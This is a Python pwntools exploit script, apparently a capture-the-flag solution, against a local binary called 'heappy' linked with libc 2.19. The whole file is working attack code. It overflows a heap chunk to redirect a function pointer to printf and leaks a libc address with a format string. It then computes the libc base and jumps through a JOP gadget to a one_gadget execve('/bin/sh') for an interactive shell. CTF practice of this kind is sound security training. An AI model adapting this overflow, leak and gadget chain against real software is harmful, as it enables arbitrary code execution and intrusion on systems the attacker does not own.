from pwn import *


def recv_n_lines(r, n):
    for _ in range(n):
        r.recvline()


def main():
    filename = "./heappy"
    elf = ELF(filename)
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    r = process([filename])
    skip_lang, skip_name, skip_menu = 4, 2, 5
    padding = 144
    _printf = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(_printf)
    payload = payload[:-1] # the last null byte is added by scanf
    # choose language
    recv_n_lines(r, skip_lang)
    r.sendline("1")
    # choose name
    recv_n_lines(r, skip_name)
    r.sendline("pwn")
    # change language -> allocate new chunk
    recv_n_lines(r, skip_menu)
    r.sendline("2")
    # ita language
    recv_n_lines(r, skip_lang)
    r.sendline("2")
    # change name
    recv_n_lines(r, skip_menu)
    r.sendline("1")
    # overflow in functions' chunk
    recv_n_lines(r, skip_name)
    r.sendline(payload)
    # for libc leak
    r.recvuntil('nome?')
    r.sendline('%13$p')
    # now the program is buggy and always asks for name
    r.recvuntil('nome?')
    r.sendline('pwn')
    r.recvline()
    leak = r.recvline()
    leak = bytes.fromhex(leak.split(b'0x')[1][:12].decode())[::-1]
    print(leak)
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 234 - libc.symbols["__libc_start_main"]
    # 0x0000000000198aec : pop rax ; xor al, 0xed ; jmp qword ptr [rdx]
    # to satisfy:
    """
    0x4647c execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    """
    # for some reason, need to adjust by -11 gadgets found with ROPgadget and with one_gadget
    move_stack_JOP_gadget = libc.address + 0x0000000000198aec - 11
    one_gadget_RCE_constrained = libc.address + 0x4647c - 11
    payload = p64(one_gadget_RCE_constrained) + b"A" * (padding - 8) + p64(move_stack_JOP_gadget)
    bad_chars = [b'\t', b'\n', b'\v', b'\f', b'\r', b' ', b'\x05', b'\x11']
    assert all([i not in payload for i in bad_chars])
    print(payload)
    r.recvuntil('?')
    r.send(payload + b'\n')
    r.interactive()


if __name__ == "__main__":
    main()

    

 
